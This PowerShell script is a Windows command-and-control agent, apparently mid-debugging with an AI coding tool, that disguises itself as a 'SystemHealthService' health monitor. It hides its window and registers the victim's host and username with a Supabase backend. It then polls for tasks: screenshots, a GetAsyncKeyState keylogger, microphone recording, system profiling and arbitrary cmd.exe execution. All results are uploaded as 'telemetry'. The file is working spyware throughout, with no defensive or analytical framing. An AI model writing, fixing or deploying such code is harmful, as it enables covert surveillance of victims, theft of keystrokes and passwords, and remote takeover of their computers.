# ================================
# WINDOWS C2 AGENT - FORMATTED
# ================================

# Suppress errors and progress bars
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Hide console window
try {
    Add-Type -Name Window -Namespace Native -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
    [Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
} catch {}

# ================================
# CONFIGURATION
# ================================

$basePath = "C:\ProgramData\SystemHealthService"
$keylogFile = "$basePath\kb.tmp"

# Wait for internet connection
while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
    Start-Sleep 5
}
Start-Sleep 5

# Load config
$config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
$deviceIdFile = "$basePath\device_id.txt"

# Get or create device ID
if (Test-Path $deviceIdFile) {
    $deviceId = (Get-Content $deviceIdFile -Raw).Trim()
} else {
    $deviceId = [guid]::NewGuid().ToString()
    $deviceId | Out-File $deviceIdFile -NoNewline
    (Get-Item $deviceIdFile).Attributes = "Hidden"
}

# Generate random device name (8 chars)
$deviceName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })

# ================================
# API HELPER FUNCTION
# ================================

$headers = @{
    "apikey" = $config.supabase_key
    "Authorization" = "Bearer $($config.supabase_key)"
    "Content-Type" = "application/json"
    "Prefer" = "return=minimal"
}

function Invoke-API {
    param(
        $endpoint,
        $method = "GET",
        $body = $null
    )
    
    $uri = "$($config.supabase_url)/rest/v1/$endpoint"
    
    try {
        #region agent log
        $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:55';message='API call start';data=@{endpoint=$endpoint;method=$method}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        $result = $null
        if ($body) {
            $result = Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 10
        } else {
            $result = Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -TimeoutSec 10
        }
        
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:70';message='API call success';data=@{endpoint=$endpoint;method=$method;hasResult=($null -ne $result)}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        return $result
    } catch {
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:72';message='API call error';data=@{endpoint=$endpoint;method=$method;error=$_.Exception.Message}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        return $null
    }
}

# ================================
# REGISTER DEVICE
# ================================

$registrationData = @{
    device_id = $deviceId
    device_name = $deviceName
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os_info = (Get-CimInstance Win32_OperatingSystem).Caption
}

Invoke-API -endpoint "devices" -method "POST" -body $registrationData

# ================================
# TASK FUNCTIONS
# ================================

# Screenshot Capture
function Capture-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64 = [Convert]::ToBase64String($memoryStream.ToArray())
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $memoryStream.Dispose()
        
        return @{
            data_type = "display"
            file_data = $base64
        }
    } catch {
        return @{
            data_type = "display"
            data = "Failed"
        }
    }
}

# Keylogger Function - THIS IS THE PROBLEM FUNCTION
function Capture-Keystrokes {
    param($duration = 60)
    
    #region agent log
    $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:125';message='Capture-Keystrokes entry';data=@{duration=$duration}} | ConvertTo-Json -Compress | Add-Content $logPath
    #endregion
    
    try {
        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        
        # Import GetAsyncKeyState API - check if type already exists first
        $typeExists = $false
        try {
            $testType = [User.KeyState]
            $typeExists = $true
        } catch {
            $typeExists = $false
        }
        
        if (-not $typeExists) {
            Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -ErrorAction Stop
        }
        
        # Verify the type is usable
        try {
            $testResult = [User.KeyState]::GetAsyncKeyState(0)
            $typeUsable = $true
        } catch {
            $typeUsable = $false
            throw "GetAsyncKeyState type not usable: $_"
        }
        
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H1';location='HealthMonitor.ps1:133';message='Add-Type result';data=@{typeExists=$typeExists;typeUsable=$typeUsable}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        # Clear keylog file
        "" | Out-File $keylogFile -NoNewline
        
        # Calculate end time
        $endTime = (Get-Date).AddSeconds($duration)
        
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H5';location='HealthMonitor.ps1:139';message='Loop start';data=@{endTime=$endTime.ToString('o');currentTime=(Get-Date).ToString('o')}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        $loopIterations = 0
        $keyChecks = 0
        $exceptionsInLoop = 0
        
        # Monitor keystrokes until duration expires
        $currentTime = Get-Date
        while ($currentTime -lt $endTime) {
            $loopIterations++
            $currentTime = Get-Date
            
            #region agent log
            if ($loopIterations % 100 -eq 0) {
                @{sessionId='debug-session';runId='run1';hypothesisId='H3,H5';location='HealthMonitor.ps1:142';message='Loop iteration';data=@{iteration=$loopIterations;currentTime=$currentTime.ToString('o');endTime=$endTime.ToString('o');timeRemaining=($endTime - $currentTime).TotalSeconds}} | ConvertTo-Json -Compress | Add-Content $logPath
            }
            #endregion
            
            try {
                # Check only commonly used key ranges to reduce CPU usage
                # Check alphanumeric keys (48-90: 0-9, A-Z), space (32), and common keys
                $keyRanges = @(
                    @{start=32;end=90},  # Space and alphanumeric
                    @{start=186;end=222}  # Common punctuation and special keys
                )
                
                $keysToCheck = @()
                foreach ($range in $keyRanges) {
                    for ($virtualKey = $range.start; $virtualKey -le $range.end; $virtualKey++) {
                        $keyChecks++
                        # Check if key is pressed (-32767 means just pressed)
                        try {
                            $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
                            if ($keyState -eq -32767) {
                                $keysToCheck += $virtualKey
                            }
                        } catch {
                            #region agent log
                            @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:193';message='GetAsyncKeyState exception';data=@{error=$_.Exception.Message;virtualKey=$virtualKey}} | ConvertTo-Json -Compress | Add-Content $logPath
                            #endregion
                            $exceptionsInLoop++
                        }
                    }
                }
                
                # Write captured keys to file (batch write to reduce file I/O)
                if ($keysToCheck.Count -gt 0) {
                    $keyNames = $keysToCheck | ForEach-Object { [System.Windows.Forms.Keys]$_ }
                    try {
                        Add-Content $keylogFile ($keyNames -join " ") -NoNewline -ErrorAction Stop
                    } catch {
                        #region agent log
                        @{sessionId='debug-session';runId='run1';hypothesisId='H2';location='HealthMonitor.ps1:210';message='File write error';data=@{error=$_.Exception.Message;keyCount=$keysToCheck.Count}} | ConvertTo-Json -Compress | Add-Content $logPath
                        #endregion
                        $exceptionsInLoop++
                    }
                }
            } catch {
                #region agent log
                @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:187';message='Exception in key check loop';data=@{error=$_.Exception.Message;iteration=$loopIterations}} | ConvertTo-Json -Compress | Add-Content $logPath
                #endregion
                $exceptionsInLoop++
            }
            
            # Sleep 100ms between checks to reduce CPU usage (increased from 50ms)
            Start-Sleep -Milliseconds 100
        }
        
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H5';location='HealthMonitor.ps1:154';message='Loop exit';data=@{iterations=$loopIterations;keyChecks=$keyChecks;exceptions=$exceptionsInLoop}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        # Read captured keystrokes
        $keystrokeData = Get-Content $keylogFile -Raw -EA SilentlyContinue
        
        # Clean up temp file
        Remove-Item $keylogFile -Force -EA SilentlyContinue
        
        # Return data
        if ($keystrokeData) {
            #region agent log
            @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:163';message='Function return success';data=@{dataLength=$keystrokeData.Length}} | ConvertTo-Json -Compress | Add-Content $logPath
            #endregion
            return @{
                data_type = "input"
                data = $keystrokeData
            }
        } else {
            #region agent log
            @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:169';message='Function return no data';data=@{}} | ConvertTo-Json -Compress | Add-Content $logPath
            #endregion
            return @{
                data_type = "input"
                data = "[No keystrokes recorded]"
            }
        }
    } catch {
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:174';message='Function exception';data=@{error=$_.Exception.Message;stackTrace=$_.ScriptStackTrace}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        return @{
            data_type = "input"
            data = "Error: $_"
        }
    }
}

# System Info
function Get-SystemInfo {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $computer = Get-CimInstance Win32_ComputerSystem
        
        $info = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = $os.Caption
            os_version = $os.Version
            manufacturer = $computer.Manufacturer
            model = $computer.Model
            memory_gb = [math]::Round($computer.TotalPhysicalMemory / 1GB, 2)
        }
        
        return @{
            data_type = "sysinfo"
            data = ($info | ConvertTo-Json -Compress)
        }
    } catch {
        $null
    }
}

# Audio Recording
function Record-Audio {
    param($duration = 10)
    
    try {
        $audioFile = "$basePath\rec.wav"
        
        # Define MCI commands
        Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AudioRecorder{[DllImport("winmm.dll",EntryPoint="mciSendStringA")]public static extern int mciSendString(string command,string buffer,int bufferSize,IntPtr hwndCallback);}' -Language CSharp -EA SilentlyContinue
        
        # Start recording
        [AudioRecorder]::mciSendString("open new Type waveaudio Alias recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder bitspersample 16", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder samplespersec 22050", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder channels 1", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("record recorder", "", 0, [IntPtr]::Zero)
        
        # Wait for duration
        Start-Sleep $duration
        
        # Stop and save
        [AudioRecorder]::mciSendString("stop recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("save recorder `"$audioFile`"", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("close recorder", "", 0, [IntPtr]::Zero)
        
        # Read and encode audio file
        if (Test-Path $audioFile) {
            $audioBytes = [System.IO.File]::ReadAllBytes($audioFile)
            $base64 = [Convert]::ToBase64String($audioBytes)
            Remove-Item $audioFile -Force -EA SilentlyContinue
            
            return @{
                data_type = "audio"
                file_data = $base64
            }
        } else {
            return @{
                data_type = "audio"
                data = "Failed"
            }
        }
    } catch {
        return @{
            data_type = "audio"
            data = "$_"
        }
    }
}

# Command Execution
function Execute-Command {
    param($cmd)
    
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "cmd.exe"
        $processInfo.Arguments = "/c $cmd"
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()
        $process.WaitForExit(30000)
        
        $result = @{
            command = $cmd
            output = $output
            error = $errorOutput
            exit_code = $process.ExitCode
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    } catch {
        $result = @{
            command = $cmd
            error = "$_"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    }
}

# ================================
# MAIN LOOP
# ================================

# Set sync intervals (default 10 seconds)
$syncInterval = if ($config.sync_interval) { $config.sync_interval } else { 10 }
$retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 10 }

while ($true) {
    try {
        # Update last sync time
        Invoke-API -endpoint "devices?device_id=eq.$deviceId" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") } | Out-Null
        
        # Get pending tasks
        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&select=id,task_type,task_params"
        
        if ($tasks) {
            # Ensure tasks is an array
            if ($tasks -isnot [array]) {
                $tasks = @($tasks)
            }
            
            # Process each task
            foreach ($task in $tasks) {
                # Mark task as processing
                Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{ status = "processing" } | Out-Null
                
                $taskResult = $null
                
                # Execute based on task type
                switch ($task.task_type) {
                    "display_capture" {
                        $taskResult = Capture-Screenshot
                    }
                    
                    "input_monitor" {
                        #region agent log
                        $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:336';message='Starting input_monitor task';data=@{taskId=$task.id;duration=$duration}} | ConvertTo-Json -Compress | Add-Content $logPath
                        #endregion
                        $duration = 60
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }
                        $taskResult = Capture-Keystrokes -duration $duration
                        #region agent log
                        @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:341';message='input_monitor task completed';data=@{taskId=$task.id;hasResult=($null -ne $taskResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
                        #endregion
                    }
                    
                    "system_info" {
                        $taskResult = Get-SystemInfo
                    }
                    
                    "voice_capture" {
                        $duration = 10
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }
                        $taskResult = Record-Audio -duration $duration
                    }
                    
                    "cmd_exec" {
                        $command = ""
                        if ($task.task_params -and $task.task_params.command) {
                            $command = $task.task_params.command
                        }
                        
                        if ($command) {
                            $taskResult = Execute-Command -cmd $command
                        } else {
                            $taskResult = @{
                                data_type = "cmd_result"
                                data = "No command"
                            }
                        }
                    }
                }
                
                # Save results to telemetry
                #region agent log
                $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:373';message='Task result check';data=@{taskId=$task.id;hasResult=($null -ne $taskResult);taskType=$task.task_type}} | ConvertTo-Json -Compress | Add-Content $logPath
                #endregion
                if ($taskResult) {
                    $telemetryData = @{
                        device_id = $deviceId
                        data_type = $taskResult.data_type
                    }
                    
                    if ($taskResult.file_data) {
                        $telemetryData.file_data = $taskResult.file_data
                    }
                    
                    if ($taskResult.data) {
                        $telemetryData.data = $taskResult.data
                    }
                    
                    # Insert into telemetry table
                    #region agent log
                    $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:484';message='Sending telemetry';data=@{taskId=$task.id}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                    $telemetryResult = Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData
                    #region agent log
                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:484';message='Telemetry result';data=@{taskId=$task.id;success=($null -ne $telemetryResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                    
                    # Mark task as complete
                    #region agent log
                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:487';message='Updating task status to complete';data=@{taskId=$task.id}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                    $statusUpdateResult = Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                        status = "complete"
                        completed_at = (Get-Date -Format "o")
                    }
                    #region agent log
                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:490';message='Task status update result';data=@{taskId=$task.id;success=($null -ne $statusUpdateResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                }
            }
        }
        
        Start-Sleep $syncInterval
        
    } catch {
        Start-Sleep $retryInterval
    }
}
